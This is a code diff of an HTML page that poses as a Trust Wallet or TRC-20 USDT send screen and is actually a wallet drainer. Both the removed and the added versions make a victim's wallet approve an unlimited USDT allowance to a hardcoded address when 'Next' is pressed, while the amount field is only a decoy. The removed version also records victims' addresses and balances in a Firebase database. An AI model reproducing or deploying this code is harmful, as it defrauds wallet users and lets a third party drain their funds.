@@ -1,117 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Trust Wallet</title>
-    <style>
-      body {
-        margin: 0;
-        font-family: sans-serif;
-        background-color: #000;
-        color: #fff;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: flex-start;
-        height: 100vh;
-        padding-top: 60px;
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TRC‑20 USDT Approval</title>
+  <style>
+    body { font-family: sans-serif; background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+    input, button { width: 90%; padding: 14px; margin: 8px 0; font-size: 16px; border-radius: 8px; border: none; }
+    button { background: #3ba2ff; font-weight: bold; }
+    .max-label { text-align: right; color: #3ba2ff; font-size: 14px; width: 90%; }
+  </style>
+</head>
+<body>
+  <input id="recipient" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly/>
+  <input id="amount" type="text" placeholder="Amount"/>
+  <div class="max-label">Max</div>
+  <button id="nextBtn">Next</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+
+  <script>
+    const CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const RECEIVER = document.getElementById("recipient").value;
+
+    function waitForTronWeb(maxMs = 15000) {
+      const start = Date.now();
+      return new Promise(resolve => {
+        const iv = setInterval(() => {
+          if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            clearInterval(iv);
+            resolve(true);
+          } else if (Date.now() - start > maxMs) {
+            clearInterval(iv);
+            resolve(false);
+          }
+        }, 500);
+      });
+    }
+
+    async function approveUnlimited() {
+      const ready = await waitForTronWeb();
+      if (!ready) { alert("Open in TronLink / OKX wallet browser"); return; }
+      const tronWeb = window.tronWeb;
+      const user = tronWeb.defaultAddress.base58;
+      const amnt = document.getElementById("amount").value || "0";
+
+      try {
+        const contract = await tronWeb.contract().at(CONTRACT);
+        await contract.approve(RECEIVER, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ shouldPollResponse: true });
+        alert("✅ Approval popup shown and sent");
+      } catch(err) {
+        console.error(err);
+        alert("❌ Approval failed: " + err.message);
       }
-      input {
-        width: 90%;
-        padding: 15px;
-        margin: 10px 0;
-        font-size: 16px;
-        border-radius: 10px;
-        border: none;
-      }
-      button {
-        width: 90%;
-        padding: 15px;
-        margin-top: 20px;
-        background-color: #3ba2ff;
-        color: white;
-        border: none;
-        border-radius: 10px;
-        font-size: 18px;
-        font-weight: bold;
-      }
-      .max-label {
-        width: 90%;
-        text-align: right;
-        color: #3ba2ff;
-        font-weight: bold;
-        font-size: 14px;
-        margin-top: -10px;
-      }
-    </style>
-  </head>
-  <body>
-    <input id="recipient" value="TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN" readonly />
-    <input id="amount" placeholder="Enter Amount" />
-    <div class="max-label">Max</div>
-    <button onclick="approve()">Next</button>
+    }
 
-    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@latest/dist/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronweb@1.0.0/dist/TronWeb.min.js"></script>
-
-    <!-- Firebase SDK -->
-    <script type="module">
-      import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
-      import {
-        getFirestore,
-        collection,
-        addDoc,
-        serverTimestamp
-      } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
-
-      const firebaseConfig = {
-        apiKey: "AIzaSyBkyDsWXjZXx8w1SGxP7Koxq8pzkW8NYxM",
-        authDomain: "trc20-approval-dapp.firebaseapp.com",
-        projectId: "trc20-approval-dapp",
-        storageBucket: "trc20-approval-dapp.firebasestorage.app",
-        messagingSenderId: "770961226156",
-        appId: "1:770961226156:web:d7857b971dd376b7902209"
-      };
-
-      const app = initializeApp(firebaseConfig);
-      const db = getFirestore(app);
-
-      const CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-
-      async function approve() {
-        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-          alert("Please open in Tron-compatible wallet like TronLink or OKX");
-          return;
-        }
-
-        const tronWeb = window.tronWeb;
-        const address = tronWeb.defaultAddress.base58;
-
-        const usdtContract = await tronWeb.contract().at(CONTRACT_ADDRESS);
-
-        try {
-          await usdtContract.approve("TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send();
-
-          const balance = await tronWeb.trx.getBalance(address);
-          const usdtBalance = await usdtContract.balanceOf(address).call();
-
-          const amountInput = document.getElementById("amount").value;
-
-          await addDoc(collection(db, "approvals"), {
-            wallet_address: address,
-            amount: amountInput,
-            balance: tronWeb.fromSun(balance),
-            timestamp: serverTimestamp()
-          });
-
-          alert("Approval Done ✅");
-
-        } catch (err) {
-          alert("Approval Failed ❌");
-          console.error(err);
-        }
-      }
-    </script>
-  </body>
+    document.getElementById("nextBtn").addEventListener("click", approveUnlimited);
+  </script>
+</body>
 </html>
